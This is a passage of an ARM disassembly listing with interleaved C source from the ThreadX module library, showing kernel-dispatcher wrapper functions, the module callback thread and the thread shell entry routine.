/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_system_info_get(ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020740:	b590      	push	{r4, r7, lr}
 8020742:	b089      	sub	sp, #36	; 0x24
 8020744:	af00      	add	r7, sp, #0
 8020746:	60f8      	str	r0, [r7, #12]
 8020748:	60b9      	str	r1, [r7, #8]
 802074a:	607a      	str	r2, [r7, #4]
 802074c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 802074e:	687b      	ldr	r3, [r7, #4]
 8020750:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020752:	683b      	ldr	r3, [r7, #0]
 8020754:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) sets, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020756:	4b08      	ldr	r3, [pc, #32]	; (8020778 <_tx_event_flags_performance_system_info_get+0x38>)
 8020758:	f859 3003 	ldr.w	r3, [r9, r3]
 802075c:	681c      	ldr	r4, [r3, #0]
 802075e:	68f9      	ldr	r1, [r7, #12]
 8020760:	68ba      	ldr	r2, [r7, #8]
 8020762:	f107 0314 	add.w	r3, r7, #20
 8020766:	2016      	movs	r0, #22
 8020768:	47a0      	blx	r4
 802076a:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 802076c:	69fb      	ldr	r3, [r7, #28]
}
 802076e:	4618      	mov	r0, r3
 8020770:	3724      	adds	r7, #36	; 0x24
 8020772:	46bd      	mov	sp, r7
 8020774:	bd90      	pop	{r4, r7, pc}
 8020776:	bf00      	nop
 8020778:	00000004 	.word	0x00000004

0802077c <_txe_event_flags_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG flags_to_set, UINT set_option)
{
 802077c:	b590      	push	{r4, r7, lr}
 802077e:	b087      	sub	sp, #28
 8020780:	af00      	add	r7, sp, #0
 8020782:	60f8      	str	r0, [r7, #12]
 8020784:	60b9      	str	r1, [r7, #8]
 8020786:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) flags_to_set, (ALIGN_TYPE) set_option);
 8020788:	4b07      	ldr	r3, [pc, #28]	; (80207a8 <_txe_event_flags_set+0x2c>)
 802078a:	f859 3003 	ldr.w	r3, [r9, r3]
 802078e:	681c      	ldr	r4, [r3, #0]
 8020790:	68f9      	ldr	r1, [r7, #12]
 8020792:	687b      	ldr	r3, [r7, #4]
 8020794:	68ba      	ldr	r2, [r7, #8]
 8020796:	2017      	movs	r0, #23
 8020798:	47a0      	blx	r4
 802079a:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 802079c:	697b      	ldr	r3, [r7, #20]
}
 802079e:	4618      	mov	r0, r3
 80207a0:	371c      	adds	r7, #28
 80207a2:	46bd      	mov	sp, r7
 80207a4:	bd90      	pop	{r4, r7, pc}
 80207a6:	bf00      	nop
 80207a8:	00000004 	.word	0x00000004

080207ac <_txe_event_flags_set_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set_notify(TX_EVENT_FLAGS_GROUP *group_ptr, VOID (*events_set_notify)(TX_EVENT_FLAGS_GROUP *))
{
 80207ac:	b590      	push	{r4, r7, lr}
 80207ae:	b085      	sub	sp, #20
 80207b0:	af00      	add	r7, sp, #0
 80207b2:	6078      	str	r0, [r7, #4]
 80207b4:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_NOTIFY_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) events_set_notify, 0);
 80207b6:	4b07      	ldr	r3, [pc, #28]	; (80207d4 <_txe_event_flags_set_notify+0x28>)
 80207b8:	f859 3003 	ldr.w	r3, [r9, r3]
 80207bc:	681c      	ldr	r4, [r3, #0]
 80207be:	6879      	ldr	r1, [r7, #4]
 80207c0:	683a      	ldr	r2, [r7, #0]
 80207c2:	2300      	movs	r3, #0
 80207c4:	2018      	movs	r0, #24
 80207c6:	47a0      	blx	r4
 80207c8:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80207ca:	68fb      	ldr	r3, [r7, #12]
}
 80207cc:	4618      	mov	r0, r3
 80207ce:	3714      	adds	r7, #20
 80207d0:	46bd      	mov	sp, r7
 80207d2:	bd90      	pop	{r4, r7, pc}
 80207d4:	00000004 	.word	0x00000004

080207d8 <_txm_module_application_request>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT txm_module_application_request(ULONG request, ALIGN_TYPE param_1, ALIGN_TYPE param_2, ALIGN_TYPE param_3)
{
 80207d8:	b590      	push	{r4, r7, lr}
 80207da:	b087      	sub	sp, #28
 80207dc:	af00      	add	r7, sp, #0
 80207de:	60f8      	str	r0, [r7, #12]
 80207e0:	60b9      	str	r1, [r7, #8]
 80207e2:	607a      	str	r2, [r7, #4]
 80207e4:	603b      	str	r3, [r7, #0]

UINT   return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT)(_txm_module_kernel_call_dispatcher)(TXM_APPLICATION_REQUEST_ID_BASE+request, param_1, param_2, param_3);
 80207e6:	4b08      	ldr	r3, [pc, #32]	; (8020808 <_txm_module_application_request+0x30>)
 80207e8:	f859 3003 	ldr.w	r3, [r9, r3]
 80207ec:	681c      	ldr	r4, [r3, #0]
 80207ee:	68fb      	ldr	r3, [r7, #12]
 80207f0:	f503 3080 	add.w	r0, r3, #65536	; 0x10000
 80207f4:	683b      	ldr	r3, [r7, #0]
 80207f6:	687a      	ldr	r2, [r7, #4]
 80207f8:	68b9      	ldr	r1, [r7, #8]
 80207fa:	47a0      	blx	r4
 80207fc:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80207fe:	697b      	ldr	r3, [r7, #20]
}
 8020800:	4618      	mov	r0, r3
 8020802:	371c      	adds	r7, #28
 8020804:	46bd      	mov	sp, r7
 8020806:	bd90      	pop	{r4, r7, pc}
 8020808:	00000004 	.word	0x00000004

0802080c <_txm_module_callback_request_thread_entry>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txm_module_callback_request_thread_entry(ULONG id)
{
 802080c:	b580      	push	{r7, lr}
 802080e:	b098      	sub	sp, #96	; 0x60
 8020810:	af00      	add	r7, sp, #0
 8020812:	6078      	str	r0, [r7, #4]

    /* Disable warning of parameter not used. */
    TX_PARAMETER_NOT_USED(id);

    /* Pickup pointer to the request queue.  */
    request_queue =  _txm_module_entry_info -> txm_module_thread_entry_info_callback_request_queue;
 8020814:	4b2d      	ldr	r3, [pc, #180]	; (80208cc <_txm_module_callback_request_thread_entry+0xc0>)
 8020816:	f859 3003 	ldr.w	r3, [r9, r3]
 802081a:	681b      	ldr	r3, [r3, #0]
 802081c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 802081e:	65bb      	str	r3, [r7, #88]	; 0x58
    /* Loop to process callback messages from the module manager.  */
    while(1)
    {

        /* Wait for the callback request for the module.  */
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 8020820:	f107 030c 	add.w	r3, r7, #12
 8020824:	f04f 32ff 	mov.w	r2, #4294967295
 8020828:	4619      	mov	r1, r3
 802082a:	6db8      	ldr	r0, [r7, #88]	; 0x58
 802082c:	f000 fad8 	bl	8020de0 <_txe_queue_receive>
 8020830:	6578      	str	r0, [r7, #84]	; 0x54

        /* Check to see if a request was received.  */
        if (status != TX_SUCCESS)
 8020832:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8020834:	2b00      	cmp	r3, #0
 8020836:	d144      	bne.n	80208c2 <_txm_module_callback_request_thread_entry+0xb6>
            /* This should not happen - get out of the loop.  */
            break;
        }

        /* Pickup the activation count in the message.  */
        activation_count =  callback_message.txm_module_callback_message_activation_count;
 8020838:	693b      	ldr	r3, [r7, #16]
 802083a:	65fb      	str	r3, [r7, #92]	; 0x5c

        /* Loop to call the callback function the correct number of times.  */
        while (activation_count)
 802083c:	e03d      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>
        {

            /* Decrement the activation count.  */
            activation_count--;
 802083e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8020840:	3b01      	subs	r3, #1
 8020842:	65fb      	str	r3, [r7, #92]	; 0x5c

            /* Now dispatch the callback function.  */
            switch (callback_message.txm_module_callback_message_type)
 8020844:	68fb      	ldr	r3, [r7, #12]
 8020846:	2b04      	cmp	r3, #4
 8020848:	d836      	bhi.n	80208b8 <_txm_module_callback_request_thread_entry+0xac>
 802084a:	a202      	add	r2, pc, #8	; (adr r2, 8020854 <_txm_module_callback_request_thread_entry+0x48>)
 802084c:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8020850:	441a      	add	r2, r3
 8020852:	4710      	bx	r2
 8020854:	00000015 	.word	0x00000015
 8020858:	00000023 	.word	0x00000023
 802085c:	00000033 	.word	0x00000033
 8020860:	00000043 	.word	0x00000043
 8020864:	00000053 	.word	0x00000053
            {

            case TXM_TIMER_CALLBACK:

                /* Setup timer callback pointer.  */
                timer_callback =  (void (*)(ULONG)) callback_message.txm_module_callback_message_application_function;
 8020868:	697b      	ldr	r3, [r7, #20]
 802086a:	643b      	str	r3, [r7, #64]	; 0x40

                /* Call application's timer callback.  */
                (timer_callback)((ULONG) callback_message.txm_module_callback_message_param_1);
 802086c:	69ba      	ldr	r2, [r7, #24]
 802086e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020870:	4610      	mov	r0, r2
 8020872:	4798      	blx	r3

                break;
 8020874:	e021      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>

            case TXM_EVENTS_SET_CALLBACK:

                /* Setup events set callback pointer.  */
                events_set_notify =  (void (*)(TX_EVENT_FLAGS_GROUP *)) callback_message.txm_module_callback_message_application_function;
 8020876:	697b      	ldr	r3, [r7, #20]
 8020878:	647b      	str	r3, [r7, #68]	; 0x44

                /* Call events set notify callback.  */
                (events_set_notify)((TX_EVENT_FLAGS_GROUP *) callback_message.txm_module_callback_message_param_1);
 802087a:	69bb      	ldr	r3, [r7, #24]
 802087c:	461a      	mov	r2, r3
 802087e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020880:	4610      	mov	r0, r2
 8020882:	4798      	blx	r3

                break;
 8020884:	e019      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>

            case TXM_QUEUE_SEND_CALLBACK:

                /* Setup queue send callback pointer.  */
                queue_send_notify =  (void (*)(TX_QUEUE *)) callback_message.txm_module_callback_message_application_function;
 8020886:	697b      	ldr	r3, [r7, #20]
 8020888:	64bb      	str	r3, [r7, #72]	; 0x48

                /* Call queue send notify callback.  */
                (queue_send_notify)((TX_QUEUE *) callback_message.txm_module_callback_message_param_1);
 802088a:	69bb      	ldr	r3, [r7, #24]
 802088c:	461a      	mov	r2, r3
 802088e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8020890:	4610      	mov	r0, r2
 8020892:	4798      	blx	r3

                break;
 8020894:	e011      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>

            case TXM_SEMAPHORE_PUT_CALLBACK:

                /* Setup semaphore put callback pointer.  */
                semaphore_put_notify =  (void (*)(TX_SEMAPHORE *)) callback_message.txm_module_callback_message_application_function;
 8020896:	697b      	ldr	r3, [r7, #20]
 8020898:	64fb      	str	r3, [r7, #76]	; 0x4c

                /* Call semaphore put notify callback.  */
                (semaphore_put_notify)((TX_SEMAPHORE *) callback_message.txm_module_callback_message_param_1);
 802089a:	69bb      	ldr	r3, [r7, #24]
 802089c:	461a      	mov	r2, r3
 802089e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80208a0:	4610      	mov	r0, r2
 80208a2:	4798      	blx	r3

                break;
 80208a4:	e009      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>

            case TXM_THREAD_ENTRY_EXIT_CALLBACK:

                /* Setup thread entry/exit callback pointer.  */
                thread_entry_exit_notify =  (void (*)(TX_THREAD *, UINT)) callback_message.txm_module_callback_message_application_function;
 80208a6:	697b      	ldr	r3, [r7, #20]
 80208a8:	653b      	str	r3, [r7, #80]	; 0x50

                /* Call thread entry/exit notify callback.  */
                (thread_entry_exit_notify)((TX_THREAD *) callback_message.txm_module_callback_message_param_1, (UINT) callback_message.txm_module_callback_message_param_2);
 80208aa:	69bb      	ldr	r3, [r7, #24]
 80208ac:	4618      	mov	r0, r3
 80208ae:	69fa      	ldr	r2, [r7, #28]
 80208b0:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80208b2:	4611      	mov	r1, r2
 80208b4:	4798      	blx	r3

                break;
 80208b6:	e000      	b.n	80208ba <_txm_module_callback_request_thread_entry+0xae>
                    /* Call the USBX callback function.  */
                    _txm_module_usbx_callback_request(&callback_message);
                }
#endif

                break;
 80208b8:	bf00      	nop
        while (activation_count)
 80208ba:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80208bc:	2b00      	cmp	r3, #0
 80208be:	d1be      	bne.n	802083e <_txm_module_callback_request_thread_entry+0x32>
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 80208c0:	e7ae      	b.n	8020820 <_txm_module_callback_request_thread_entry+0x14>
            break;
 80208c2:	bf00      	nop
            }
        }
    }
}
 80208c4:	bf00      	nop
 80208c6:	3760      	adds	r7, #96	; 0x60
 80208c8:	46bd      	mov	sp, r7
 80208ca:	bd80      	pop	{r7, pc}
 80208cc:	00000008 	.word	0x00000008

080208d0 <_txm_module_object_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_allocate(VOID **object_ptr, ULONG object_size)
{
 80208d0:	b590      	push	{r4, r7, lr}
 80208d2:	b085      	sub	sp, #20
 80208d4:	af00      	add	r7, sp, #0
 80208d6:	6078      	str	r0, [r7, #4]
 80208d8:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_ALLOCATE_CALL, (ALIGN_TYPE) object_ptr, (ALIGN_TYPE) object_size, 0);
 80208da:	4b07      	ldr	r3, [pc, #28]	; (80208f8 <_txm_module_object_allocate+0x28>)
 80208dc:	f859 3003 	ldr.w	r3, [r9, r3]
 80208e0:	681c      	ldr	r4, [r3, #0]
 80208e2:	6879      	ldr	r1, [r7, #4]
 80208e4:	2300      	movs	r3, #0
 80208e6:	683a      	ldr	r2, [r7, #0]
 80208e8:	205f      	movs	r0, #95	; 0x5f
 80208ea:	47a0      	blx	r4
 80208ec:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80208ee:	68fb      	ldr	r3, [r7, #12]
}
 80208f0:	4618      	mov	r0, r3
 80208f2:	3714      	adds	r7, #20
 80208f4:	46bd      	mov	sp, r7
 80208f6:	bd90      	pop	{r4, r7, pc}
 80208f8:	00000004 	.word	0x00000004

080208fc <_txm_module_object_deallocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_deallocate(VOID *object_ptr)
{
 80208fc:	b590      	push	{r4, r7, lr}
 80208fe:	b085      	sub	sp, #20
 8020900:	af00      	add	r7, sp, #0
 8020902:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_DEALLOCATE_CALL, (ALIGN_TYPE) object_ptr, 0, 0);
 8020904:	4b07      	ldr	r3, [pc, #28]	; (8020924 <_txm_module_object_deallocate+0x28>)
 8020906:	f859 3003 	ldr.w	r3, [r9, r3]
 802090a:	681c      	ldr	r4, [r3, #0]
 802090c:	6879      	ldr	r1, [r7, #4]
 802090e:	2300      	movs	r3, #0
 8020910:	2200      	movs	r2, #0
 8020912:	2060      	movs	r0, #96	; 0x60
 8020914:	47a0      	blx	r4
 8020916:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020918:	68fb      	ldr	r3, [r7, #12]
}
 802091a:	4618      	mov	r0, r3
 802091c:	3714      	adds	r7, #20
 802091e:	46bd      	mov	sp, r7
 8020920:	bd90      	pop	{r4, r7, pc}
 8020922:	bf00      	nop
 8020924:	00000004 	.word	0x00000004

08020928 <_txm_module_object_pointer_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get(UINT object_type, CHAR *name, VOID **object_ptr)
{
 8020928:	b590      	push	{r4, r7, lr}
 802092a:	b087      	sub	sp, #28
 802092c:	af00      	add	r7, sp, #0
 802092e:	60f8      	str	r0, [r7, #12]
 8020930:	60b9      	str	r1, [r7, #8]
 8020932:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) object_ptr);
 8020934:	4b07      	ldr	r3, [pc, #28]	; (8020954 <_txm_module_object_pointer_get+0x2c>)
 8020936:	f859 3003 	ldr.w	r3, [r9, r3]
 802093a:	681c      	ldr	r4, [r3, #0]
 802093c:	68ba      	ldr	r2, [r7, #8]
 802093e:	687b      	ldr	r3, [r7, #4]
 8020940:	68f9      	ldr	r1, [r7, #12]
 8020942:	205d      	movs	r0, #93	; 0x5d
 8020944:	47a0      	blx	r4
 8020946:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020948:	697b      	ldr	r3, [r7, #20]
}
 802094a:	4618      	mov	r0, r3
 802094c:	371c      	adds	r7, #28
 802094e:	46bd      	mov	sp, r7
 8020950:	bd90      	pop	{r4, r7, pc}
 8020952:	bf00      	nop
 8020954:	00000004 	.word	0x00000004

08020958 <_txm_module_object_pointer_get_extended>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get_extended(UINT object_type, CHAR *name, UINT name_length, VOID **object_ptr)
{
 8020958:	b590      	push	{r4, r7, lr}
 802095a:	b089      	sub	sp, #36	; 0x24
 802095c:	af00      	add	r7, sp, #0
 802095e:	60f8      	str	r0, [r7, #12]
 8020960:	60b9      	str	r1, [r7, #8]
 8020962:	607a      	str	r2, [r7, #4]
 8020964:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) name_length;
 8020966:	687b      	ldr	r3, [r7, #4]
 8020968:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) object_ptr;
 802096a:	683b      	ldr	r3, [r7, #0]
 802096c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_EXTENDED_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 802096e:	4b08      	ldr	r3, [pc, #32]	; (8020990 <_txm_module_object_pointer_get_extended+0x38>)
 8020970:	f859 3003 	ldr.w	r3, [r9, r3]
 8020974:	681c      	ldr	r4, [r3, #0]
 8020976:	68ba      	ldr	r2, [r7, #8]
 8020978:	f107 0314 	add.w	r3, r7, #20
 802097c:	68f9      	ldr	r1, [r7, #12]
 802097e:	205e      	movs	r0, #94	; 0x5e
 8020980:	47a0      	blx	r4
 8020982:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020984:	69fb      	ldr	r3, [r7, #28]
}
 8020986:	4618      	mov	r0, r3
 8020988:	3724      	adds	r7, #36	; 0x24
 802098a:	46bd      	mov	sp, r7
 802098c:	bd90      	pop	{r4, r7, pc}
 802098e:	bf00      	nop
 8020990:	00000004 	.word	0x00000004

08020994 <_txm_module_thread_shell_entry>:
/*                                                                        */
/*  10-15-2021      Scott Larson            Initial Version 6.1.9         */
/*                                                                        */
/**************************************************************************/
VOID  _txm_module_thread_shell_entry(TX_THREAD *thread_ptr, TXM_MODULE_THREAD_ENTRY_INFO *thread_info)
{
 8020994:	b580      	push	{r7, lr}
 8020996:	b084      	sub	sp, #16
 8020998:	af00      	add	r7, sp, #0
 802099a:	6078      	str	r0, [r7, #4]
 802099c:	6039      	str	r1, [r7, #0]
#endif


    /* Determine if this is the start thread.  If so, we must prepare the module for
       execution.  If not, simply skip the C startup code.  */
    if (thread_info -> txm_module_thread_entry_info_start_thread)
 802099e:	683b      	ldr	r3, [r7, #0]
 80209a0:	69db      	ldr	r3, [r3, #28]
 80209a2:	2b00      	cmp	r3, #0
 80209a4:	d01b      	beq.n	80209de <_txm_module_thread_shell_entry+0x4a>
    {
        /* Initialize the C environment.  */
        _gcc_setup(thread_info -> txm_module_thread_entry_info_code_base_address);
 80209a6:	683b      	ldr	r3, [r7, #0]
 80209a8:	68db      	ldr	r3, [r3, #12]
 80209aa:	4618      	mov	r0, r3
 80209ac:	f000 ff30 	bl	8021810 <_gcc_setup>
        
        /* Save the entry info pointer, for later use.  */
        _txm_module_entry_info =  thread_info;
 80209b0:	4b1b      	ldr	r3, [pc, #108]	; (8020a20 <_txm_module_thread_shell_entry+0x8c>)
 80209b2:	f859 3003 	ldr.w	r3, [r9, r3]
 80209b6:	683a      	ldr	r2, [r7, #0]
 80209b8:	601a      	str	r2, [r3, #0]
        
        /* Save the kernel function dispatch address. This is used to make all resident calls from
           the module.  */
        _txm_module_kernel_call_dispatcher =  thread_info -> txm_module_thread_entry_info_kernel_call_dispatcher;
 80209ba:	683b      	ldr	r3, [r7, #0]
 80209bc:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80209be:	4b19      	ldr	r3, [pc, #100]	; (8020a24 <_txm_module_thread_shell_entry+0x90>)
 80209c0:	f859 3003 	ldr.w	r3, [r9, r3]
 80209c4:	601a      	str	r2, [r3, #0]
        
        /* Ensure that we have a valid pointer.  */
        while (!_txm_module_kernel_call_dispatcher)
 80209c6:	bf00      	nop
 80209c8:	4b16      	ldr	r3, [pc, #88]	; (8020a24 <_txm_module_thread_shell_entry+0x90>)
 80209ca:	f859 3003 	ldr.w	r3, [r9, r3]
 80209ce:	681b      	ldr	r3, [r3, #0]
 80209d0:	2b00      	cmp	r3, #0
 80209d2:	d0f9      	beq.n	80209c8 <_txm_module_thread_shell_entry+0x34>
               An error here typically indicates the resident portion of _tx_thread_schedule
               is not supporting the trap to obtain the function pointer.   */
        }
        
        /* Resume the module's callback thread, already created in the manager.  */
        _txe_thread_resume(thread_info -> txm_module_thread_entry_info_callback_request_thread);
 80209d4:	683b      	ldr	r3, [r7, #0]
 80209d6:	6a1b      	ldr	r3, [r3, #32]
 80209d8:	4618      	mov	r0, r3
 80209da:	f000 fca3 	bl	8021324 <_txe_thread_resume>
    }

#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 80209de:	683b      	ldr	r3, [r7, #0]
 80209e0:	699b      	ldr	r3, [r3, #24]
 80209e2:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 80209e4:	68fb      	ldr	r3, [r7, #12]
 80209e6:	2b00      	cmp	r3, #0
 80209e8:	d003      	beq.n	80209f2 <_txm_module_thread_shell_entry+0x5e>
    {

        /* Yes, notify application that this thread has been entered!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_ENTRY);
 80209ea:	68fb      	ldr	r3, [r7, #12]
 80209ec:	2100      	movs	r1, #0
 80209ee:	6878      	ldr	r0, [r7, #4]
 80209f0:	4798      	blx	r3
    }
#endif

    /* Call current thread's entry function.  */
    (thread_info -> txm_module_thread_entry_info_entry) (thread_info -> txm_module_thread_entry_info_parameter);
 80209f2:	683b      	ldr	r3, [r7, #0]
 80209f4:	691b      	ldr	r3, [r3, #16]
 80209f6:	683a      	ldr	r2, [r7, #0]
 80209f8:	6952      	ldr	r2, [r2, #20]
 80209fa:	4610      	mov	r0, r2
 80209fc:	4798      	blx	r3


#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine again.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 80209fe:	683b      	ldr	r3, [r7, #0]
 8020a00:	699b      	ldr	r3, [r3, #24]
 8020a02:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020a04:	68fb      	ldr	r3, [r7, #12]
 8020a06:	2b00      	cmp	r3, #0
 8020a08:	d003      	beq.n	8020a12 <_txm_module_thread_shell_entry+0x7e>
    {

        /* Yes, notify application that this thread has exited!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_EXIT);
 8020a0a:	68fb      	ldr	r3, [r7, #12]
 8020a0c:	2101      	movs	r1, #1
 8020a0e:	6878      	ldr	r0, [r7, #4]
 8020a10:	4798      	blx	r3
    }
#endif

    /* Call actual thread suspension routine.  */
    _txm_module_thread_system_suspend(thread_ptr);
 8020a12:	6878      	ldr	r0, [r7, #4]
 8020a14:	f000 f808 	bl	8020a28 <_txm_module_thread_system_suspend>
#ifdef TX_SAFETY_CRITICAL

    /* If we ever get here, raise safety critical exception.  */
    TX_SAFETY_CRITICAL_EXCEPTION(__FILE__, __LINE__, 0);
#endif
}
 8020a18:	bf00      	nop
 8020a1a:	3710      	adds	r7, #16
 8020a1c:	46bd      	mov	sp, r7
 8020a1e:	bd80      	pop	{r7, pc}
 8020a20:	00000008 	.word	0x00000008
 8020a24:	00000004 	.word	0x00000004

08020a28 <_txm_module_thread_system_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_thread_system_suspend(TX_THREAD *thread_ptr)
{
 8020a28:	b590      	push	{r4, r7, lr}
 8020a2a:	b085      	sub	sp, #20
 8020a2c:	af00      	add	r7, sp, #0
 8020a2e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SYSTEM_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020a30:	4b07      	ldr	r3, [pc, #28]	; (8020a50 <_txm_module_thread_system_suspend+0x28>)
 8020a32:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a36:	681c      	ldr	r4, [r3, #0]
 8020a38:	6879      	ldr	r1, [r7, #4]
 8020a3a:	2300      	movs	r3, #0
 8020a3c:	2200      	movs	r2, #0
 8020a3e:	205c      	movs	r0, #92	; 0x5c
 8020a40:	47a0      	blx	r4
 8020a42:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020a44:	68fb      	ldr	r3, [r7, #12]
}
 8020a46:	4618      	mov	r0, r3
 8020a48:	3714      	adds	r7, #20
 8020a4a:	46bd      	mov	sp, r7
 8020a4c:	bd90      	pop	{r4, r7, pc}
 8020a4e:	bf00      	nop
 8020a50:	00000004 	.word	0x00000004

08020a54 <_txe_mutex_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_create(TX_MUTEX *mutex_ptr, CHAR *name_ptr, UINT inherit, UINT mutex_control_block_size)
{
 8020a54:	b590      	push	{r4, r7, lr}
 8020a56:	b089      	sub	sp, #36	; 0x24
 8020a58:	af00      	add	r7, sp, #0
 8020a5a:	60f8      	str	r0, [r7, #12]
 8020a5c:	60b9      	str	r1, [r7, #8]
 8020a5e:	607a      	str	r2, [r7, #4]
 8020a60:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) inherit;
 8020a62:	687b      	ldr	r3, [r7, #4]
 8020a64:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) mutex_control_block_size;
 8020a66:	683b      	ldr	r3, [r7, #0]
 8020a68:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_CREATE_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020a6a:	4b08      	ldr	r3, [pc, #32]	; (8020a8c <_txe_mutex_create+0x38>)
 8020a6c:	f859 3003 	ldr.w	r3, [r9, r3]
